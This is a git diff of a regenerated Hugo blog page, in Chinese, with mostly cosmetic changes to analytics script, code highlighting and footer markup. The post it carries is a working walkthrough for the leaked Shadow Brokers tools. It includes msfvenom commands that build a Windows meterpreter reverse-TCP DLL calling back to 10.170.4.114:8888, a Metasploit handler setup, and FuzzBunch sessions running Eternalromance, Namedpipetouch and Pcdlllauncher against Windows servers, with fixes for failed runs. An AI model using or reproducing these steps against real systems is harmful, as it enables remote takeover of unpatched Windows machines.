@@ -22,7 +22,7 @@ Eternalblue &#43; Doublepulsar use Eternalblue 中间按照提示填入相应的
 <meta property='og:site_name' content='wrfly&#39;s blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='Posts'><meta property='article:tag' content='code'><meta property='article:published_time' content='2017-04-16T00:00:00Z'/><meta property='article:modified_time' content='2017-04-16T00:00:00Z'/><meta name='twitter:card' content='summary'>
 
-<meta name="generator" content="Hugo 0.40.1" />
+<meta name="generator" content="Hugo 0.52" />
 
   <title>shadowbroker大杀器 • wrfly&#39;s blog</title>
   <link rel='canonical' href='https://wrfly.kfd.me/posts/shadowbroker%E5%A4%A7%E6%9D%80%E5%99%A8/'>
@@ -30,12 +30,16 @@ Eternalblue &#43; Doublepulsar use Eternalblue 中间按照提示填入相应的
   
   <link rel='icon' href='/favicon.svg'>
 <link rel='stylesheet' href='/assets/css/main.c54db339.css'>
-<script>
-window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-ga('create', 'UA-62244864-7', 'auto');
-ga('send', 'pageview');
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-62244864-7', 'auto');
+	
+	ga('send', 'pageview');
+}
 </script>
-<script async src='//www.google-analytics.com/analytics.js'></script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
 
 </head>
 
@@ -165,21 +169,21 @@ Protocol              SMB
 Architecture          x64
 Function              RunDLL</pre></div>
 <p>这里记录一下这个 dll 是怎么生成的：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># target是32位系统
-</span><span style="color:#75715e"></span>msfvenom -p windows/meterpreter/reverse_tcp <span style="color:#ae81ff">\
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># target是32位系统</span>
+msfvenom -p windows/meterpreter/reverse_tcp <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    LHOSTT<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>.170.4.114 <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span> <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    -f dll &gt; go.dll
 
-<span style="color:#75715e"># target是64位系统
-</span><span style="color:#75715e"></span>msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color:#ae81ff">\
+<span style="color:#75715e"># target是64位系统</span>
+msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    LHOSTT<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>.170.4.114 <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span> <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    -f dll &gt; go.dll
 
-<span style="color:#75715e"># 其中 LHOST 和 LPORT 分别是target要连的机器的地址和端口
-</span><span style="color:#75715e"># msf set payload 的时候也要注意区分：
-</span><span style="color:#75715e"></span>msf &gt; use exploit/multi/handler 
+<span style="color:#75715e"># 其中 LHOST 和 LPORT 分别是target要连的机器的地址和端口</span>
+<span style="color:#75715e"># msf set payload 的时候也要注意区分：</span>
+msf &gt; use exploit/multi/handler 
 msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; set payload windows/meterpreter/reverse_tcp
 payload <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
 msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; set LHOST <span style="color:#ae81ff">10</span>.170.4.114
@@ -187,8 +191,8 @@ LHOST <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">10</s
 msf exploit<span style="color:#f92672">(</span>handler<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">8888</span>
 LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">8888</span>
 
-<span style="color:#75715e"># 然后 run 就可以了
-</span><span style="color:#75715e"></span># 需要注意的是，要先run起来，然后在从 fb.py 这边 execute</code></pre></div>
+<span style="color:#75715e"># 然后 run 就可以了</span>
+<span style="color:#75715e"># 需要注意的是，要先run起来，然后在从 fb.py 这边 execute</span></code></pre></div>
 <h3 id="eternalromence-pcdlllauncher">Eternalromence + Pcdlllauncher</h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">use Eternalromance
 
@@ -215,8 +219,8 @@ Target               SERVER_2008R2_SP0
 Payload              Callback
 
 
-<span style="color:#75715e"># 出现的问题：
-</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># 出现的问题：</span>
+
 <span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> Execute Plugin? <span style="color:#f92672">[</span>Yes<span style="color:#f92672">]</span> :
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing Plugin
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running Exploit
@@ -227,8 +231,8 @@ Payload              Callback
 <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error: Eternalromance Failed
 fb Exploit <span style="color:#f92672">(</span>Eternalromance<span style="color:#f92672">)</span> &gt;
 
-<span style="color:#75715e"># 这个时候就要去找一个可用的pipename:
-</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># 这个时候就要去找一个可用的pipename:</span>
+
 fb Exploit <span style="color:#f92672">(</span>Eternalromance<span style="color:#f92672">)</span> &gt; use Namedpipetouch
 
 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Entering Plugin Context :: Namedpipetouch
@@ -259,10 +263,10 @@ fb Touch <span style="color:#f92672">(</span>Namedpipetouch<span style="color:#f
         OS Pipe: lsass rpc - <span style="color:#ae81ff">\P</span>IPE<span style="color:#ae81ff">\l</span>sarpc
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Namedpipetouch Succeeded
 
-<span style="color:#75715e"># 然后用这个pipe就可以了，或者重新启动一下 fb.py
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e"># 成功之后再使用 Pcdlllauncher
-</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># 然后用这个pipe就可以了，或者重新启动一下 fb.py</span>
+
+<span style="color:#75715e"># 成功之后再使用 Pcdlllauncher</span>
+
 use Pcdlllauncher
 
 Module: Pcdlllauncher
@@ -279,9 +283,9 @@ ImplantFilename
 TargetOsArchitecture    x86
 PCBehavior              <span style="color:#ae81ff">8</span>
 
-<span style="color:#75715e"># LPFilename 搜一下PC_Exploit.dll的位置，填上
-</span><span style="color:#75715e"># ImplantFilename 就是上一个套路中的 go.dll or go_64.dll
-</span><span style="color:#75715e"></span># 配置好参数以后，从msf这边监听着。</code></pre></div>
+<span style="color:#75715e"># LPFilename 搜一下PC_Exploit.dll的位置，填上</span>
+<span style="color:#75715e"># ImplantFilename 就是上一个套路中的 go.dll or go_64.dll</span>
+<span style="color:#75715e"># 配置好参数以后，从msf这边监听着。</span></code></pre></div>
 <h3 id="more">More</h3>
 
 <p>还有一件比较重要的事情，因为xp都是开在虚拟机里的，CallBack这里就需要一个端口转发，端口转发的方法有很多，推荐使用ncat：</p>
@@ -295,15 +299,14 @@ PCBehavior              <span style="color:#ae81ff">8</span>
     
 <footer class='entry-footer-container'>
   <div class='entry-footer'>
-  <div class='tags'>
-  <span class='taxonomyTerm-icon'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
+  <div class='tags'><svg class='icon' viewbox='0 0 24 24' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' aria-hidden='true'>
   
   <path d="M20.59,13.41l-7.17,7.17a2,2,0,0,1-2.83,0L2,12V2H12l8.59,8.59A2,2,0,0,1,20.59,13.41Z"/>
   <line x1="7" y1="7" x2="7" y2="7"/>
   
 </svg>
-</span>
-  <span class='screen-reader'>Tags: </span><a class='tag' href='/tags/code'>Code</a></div>
+<span class='screen-reader-text'>Tags: </span></div>
+
 
   </div>
 </footer>
@@ -338,7 +341,7 @@ PCBehavior              <span style="color:#ae81ff">8</span>
   
 <div class='comments-container'>
   <div id="disqus_thread"></div>
-<script>
+<script type="application/javascript">
     var disqus_config = function () {
     
     
